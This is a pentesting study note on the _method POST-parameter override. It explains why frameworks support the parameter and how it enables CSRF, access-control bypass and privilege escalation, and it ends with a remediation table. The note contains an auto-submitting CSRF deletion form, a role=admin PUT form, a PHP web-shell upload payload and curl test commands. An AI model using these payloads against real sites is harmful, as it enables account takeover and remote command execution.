---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.24 _method (POST body) — REST Method Override"
---

# 03.24 — _method (POST Body Parameter)

## What is it?

`_method` is a POST body parameter (not a header) used by Rails, Laravel, Symfony, and other web frameworks to tunnel HTTP methods through HTML forms. HTML forms only natively support GET and POST, so `_method=DELETE` allows forms to issue DELETE/PUT/PATCH requests.

## Beginner-Level Explanation

Think of HTTP methods (like GET, POST, PUT, DELETE) as actions you can perform on a website. A GET request asks for a page (read-only), while a POST request submits new data. 

Web browsers have a limitation: standard HTML forms (`<form>`) only support GET and POST. If a developer wants to delete an item, the proper way is to use a DELETE request. Since HTML forms cannot send a DELETE request directly, developers use a workaround: they send a POST request but include a hidden field inside the form body called `_method` set to the value `DELETE`. When the server receives the request, it notices the `_method=DELETE` parameter and treats the entire request as if it were a DELETE request.

## Categories
- Web Application Security
- HTTP Request Tampering
- API Pentesting

## Use Cases

1. **Bypassing Access Controls**: Testing if a restrictive firewall blocks incoming PUT or DELETE requests, but allows POST requests containing `_method=PUT` or `_method=DELETE` to pass through to the backend server.
2. **Cross-Site Request Forgery (CSRF)**: Launching state-changing actions (like account deletion or password reset) using standard HTML forms which normally cannot perform PUT/DELETE actions.
3. **Privilege Escalation**: Forcing the server to interpret a POST request as a PUT request to update resource settings or user roles.

---

## Why This Exists

```
HTML FORM LIMITATION:
  <form method="GET">  ← only these two!
  <form method="POST">

To submit a DELETE or PUT from a form, Rails and others support:
  <form method="POST" action="/api/user/5">
    <input type="hidden" name="_method" value="DELETE">
    <input type="submit" value="Delete Account">
  </form>
  
  → Server receives POST but treats it as DELETE!
```

---

## Attack: CSRF via _method

```
HTML FORMS CAN SUBMIT CROSS-ORIGIN:
  <form method="POST" action="https://target.com/api/user/5">
    <input type="hidden" name="_method" value="DELETE">
  </form>
  <script>document.forms[0].submit()</script>
  
  → If no CSRF protection → victim's account deleted!
  → No preflight needed (it's a POST form)!

UPGRADE: Change to PUT for data modification:
  <form method="POST" action="https://target.com/api/user/5">
    <input type="hidden" name="_method" value="PUT">
    <input type="hidden" name="role" value="admin">
  </form>
```

---

## Chained Attack: File Upload via _method Bypass

```
SCENARIO: PUT /api/upload is blocked but POST is allowed.
  PUT /api/upload/shell.php → 403 Forbidden

BYPASS:
  POST /api/upload/shell.php
  _method=PUT&content=<?php system($_GET[cmd]); ?>
  
  → Server processes as PUT!
```

---

## Other Body Parameter Variants

```
_method=DELETE    → Rails, Laravel
method=DELETE     → some implementations  
_Method=DELETE    → capitalization variation
_http_method=DELETE → uncommon
```

---

## Commands

Here are the commands to test REST method override via the POST body:

```bash
# Test _method override using standard form-encoded POST
curl -i -X POST https://example.com/api/user/1 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=DELETE"

# Test _method override with PUT to change roles
curl -i -X POST https://example.com/api/user/1 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=PUT&role=admin"

# JSON body interpretation test
curl -i -X POST https://example.com/api/user/1 \
  -H "Content-Type: application/json" \
  -d '{"_method":"DELETE"}'
```

---

## Sample Output

When the server successfully interprets the override, it executes the target REST action:

```http
HTTP/2 200 OK
Date: Tue, 16 Jun 2026 10:25:00 GMT
Content-Type: application/json
Content-Length: 43
Connection: keep-alive

{"status":"success","message":"User deleted"}
```

If the action is not authorized or the server does not support the override, you might see:

```http
HTTP/2 405 Method Not Allowed
Allow: GET, POST
Content-Type: text/html
Content-Length: 154

<html>
<head><title>405 Method Not Allowed</title></head>
<body><center><h1>405 Method Not Allowed</h1></center></body>
</html>
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CSRF via _method DELETE | Add CSRF tokens to all state-changing forms |
| Privilege escalation via _method PUT | Validate authorization against overridden method |
| SameSite=None cookies | Set SameSite=Strict or Lax |

---

## Related Notes
- [[22 - X-HTTP-Method-Override]] — header version of same attack
- [[23 - X-Method-Override]] — another variant
- [[Module 07 - CSRF]] — full CSRF exploitation
